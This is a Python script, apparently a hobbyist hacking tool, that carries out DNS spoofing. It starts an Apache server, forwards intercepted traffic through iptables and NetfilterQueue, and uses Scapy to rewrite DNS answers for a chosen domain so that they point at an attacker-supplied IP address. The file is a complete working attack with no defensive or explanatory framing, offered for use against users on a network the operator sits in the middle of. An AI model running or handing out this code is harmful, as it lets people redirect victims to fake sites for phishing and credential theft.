#!/usr/bin/env python
import optparse
import netfilterqueue
import subprocess
import scapy.all as scapy
from colorama import Fore

print()
print('[+] Launching Apache2 server.')
subprocess.call('service apache2 start', shell=True)
print(f'[+] Updating IP Tables to allow {Fore.YELLOW}FORWARD{Fore.WHITE} Traffic.')
subprocess.call('iptables -I FORWARD -j NFQUEUE --queue-num 0', shell=True)


class SpoofingWebsite:
    def __init__(self, original_website, spoof_ip):
        self.spoofing_website = original_website
        self.spoof_ip = spoof_ip

    def get_original_website(self):
        return f'{self.spoofing_website}'

    def get_spoofing_address(self):
        return self.spoof_ip


def process_packet(packet):
    scapy_pkt = scapy.IP(packet.get_payload())
    if scapy_pkt.haslayer(scapy.DNSRR):
        qname = scapy_pkt[scapy.DNSQR].qname
        if s.get_original_website() in str(qname):
            print(
                f"\r[+] Spoofing {Fore.YELLOW + s.get_spoofing_address() + Fore.WHITE} as {Fore.LIGHTCYAN_EX + s.get_original_website() + Fore.WHITE}.")
            answer = scapy.DNSRR(rrname=qname, rdata=s.get_spoofing_address())
            scapy_pkt[scapy.DNS].an = answer
            scapy_pkt[scapy.DNS].ancount = 1

            del scapy_pkt[scapy.IP].len
            del scapy_pkt[scapy.IP].chksum
            del scapy_pkt[scapy.UDP].len
            del scapy_pkt[scapy.UDP].chksum

            packet.set_payload(bytes(scapy_pkt))

    packet.accept()


def get_options():
    parser = optparse.OptionParser()
    parser.add_option('-l', '--link', dest='original_website_link', help="Link for original website.")
    parser.add_option('-s', '--spoof', dest='spoofing_website_link', help="Link for spoofing website.")
    (option, argument) = parser.parse_args()

    if not option.original_website_link:
        parser.error("[!] Target website expected. Try --help for more info.")
    if not option.spoofing_website_link:
        parser.error("[!] Spoofing website expected. Try --help for more info.")

    return option


opt = get_options()

try:
    s = SpoofingWebsite(opt.original_website_link, opt.spoofing_website_link)
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()

except KeyboardInterrupt or IndexError:
    subprocess.call('iptables --flush', shell=True)
    print()
    print("\r[+] IP Tables reset to original state.")
    print('[x] Shutting down Apache2 server.')
    subprocess.call('service apache2 stop', shell=True)
    print(Fore.GREEN + "\r[x] Spoofing terminated." + Fore.WHITE)
